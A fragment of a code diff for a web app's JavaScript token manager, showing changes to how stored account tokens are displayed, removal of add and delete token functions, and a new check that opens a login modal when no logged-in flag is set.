+                    <h5 class="font-extrabold text-sm text-slate-900 truncate">${t.label || 'User Account'}</h5>
+                    <span class="text-xs text-slate-500 font-bold">(UID: ${t.userId || "4756316"})</span>
                 </div>
-            </div>`;
-    });
-    updateTokenBadge();
-}
-
-function addNewToken() {
-    const label = document.getElementById("newTokLabel").value.trim() || `Account ${TOKENS.length + 1}`;
-    const userId = document.getElementById("newTokUid").value.trim() || "4756316";
-    const token = document.getElementById("newTokValue").value.trim();
-
-    if (!token) return;
-
-    TOKENS.push({
-        id: "tok_" + Date.now(),
-        label: label,
-        userId: userId,
-        token: token
-    });
-
-    localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
-    document.getElementById("newTokLabel").value = "";
-    document.getElementById("newTokUid").value = "";
-    document.getElementById("newTokValue").value = "";
-    renderTokenManagerList();
-}
-
-function deleteToken(id) {
-    if (TOKENS.length <= 1) return;
-    TOKENS = TOKENS.filter(t => t.id !== id);
-    localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
-    renderTokenManagerList();
+                <p class="text-[11px] font-mono text-slate-500 mt-1 truncate">${t.token.slice(0, 28)}...${t.token.slice(-12)}</p>
+            </div>
+        </div>`;
 }
 
 function filterGrid() {
@@ -1511,5 +1051,10 @@ function filterGrid() {
     });
 }
 
+// Initial Call
 updateTokenBadge();
-showSlide("slideHome");
+if (localStorage.getItem("rwa_user_logged_in") === "true") {
+    showSlide("slideHome");
+} else {
+    openLoginModal();
+}
